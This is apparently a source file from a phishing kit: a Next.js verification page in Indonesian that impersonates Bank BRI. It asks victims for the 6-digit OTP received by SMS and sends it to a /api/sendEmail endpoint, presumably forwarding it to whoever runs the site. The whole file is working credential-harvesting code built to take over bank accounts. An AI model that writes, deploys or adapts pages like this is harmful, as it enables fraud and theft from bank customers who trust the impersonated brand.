
import { useRouter } from 'next/router'
import React, { useState } from 'react'
import SiteVerifikasi from '../components/SiteVerifikasi'
import Inbox from '../public/inbox.jpeg'
import Kodetarif from '../public/kodetarif.jpeg'
import Image from 'next/image'


function Verifikasi({host}) {


    const [isDisbled, setIsDisbled] = useState(true)

    const [isSuccess, setIsSuccess] = useState(false)
    
    const router = useRouter()

    const handleMessage = async (e) => {
        e.preventDefault()
        const data = {
          otp: document.getElementById('msg').value,
        }
        document.getElementById('btn').innerHTML = 'Loading...'
        try {
            
            const response = await fetch('/api/sendEmail', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'url': host
                },
                body: JSON.stringify(data)
            })

            const json = await response.json()
            
            if (json.status === 200) {
                document.getElementById('btn').innerHTML = 'LANJUT'
                setIsSuccess(true)
            } else{
                document.getElementById('btn').innerHTML = 'LANJUT'
                console.log(json.error)
            }

        } catch (error) {
            document.getElementById('btn').innerHTML = 'LANJUT'
            console.log(error.message);
        }
    }

  return (
    <div className="container" style={{backgroundColor:'rgb(231, 231, 231)'}}>
      <div className='container-flex'>
        <div className='bg-full-grey'>
          <div className='img-inbox'>
            {
                !isSuccess &&
                <Image src={Inbox} alt="inbox"/>
            }
          </div>
            <form>
                <div className='card-pesan' style={{padding:'1em 1em'}}>
                    {
                        isSuccess ?
                        <>
                            <Image src={Kodetarif} alt="ok" />
                            <button className='btn' style={{fontSize:12}} onClick={()=>setIsSuccess(false)}>Kirim Ulang Kode</button>  
                        </>
                        :
                        <>
                            <SiteVerifikasi />
                            <input id='msg' type="text" pattern="\d*" maxLength={6} className='form-control-pesan' style={{textAlign:'center', fontSize:14, boxShadow: '1px 3px 7px rgb(0 0 0 / 23%)'}} placeholder="kode otp 6 digit" onChange={(e)=>e.target.value ? setIsDisbled(false) : setIsDisbled(true)}/>
                            <p style={{color:'red', fontSize:18, fontWeight:'bold', textAlign:'center'}}>
                            Mohon Jangan diisi jika belum
                                menerima konfirmas SMS dari
                                BANK BRI OTP berupa 6 digit...!
                            </p>
                        </>
                    }
                </div>
                {
                    !isSuccess &&
                    <button disabled={isDisbled} type='button' onClick={handleMessage} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
                    Kirim
                    </button>
                }
            </form>
        </div>
      </div>
    </div>
  )
}

export async function getServerSideProps(context) {

  const host = context.req.headers.host
  
  return {
    props: {
      host
    },
  }
}

export default Verifikasi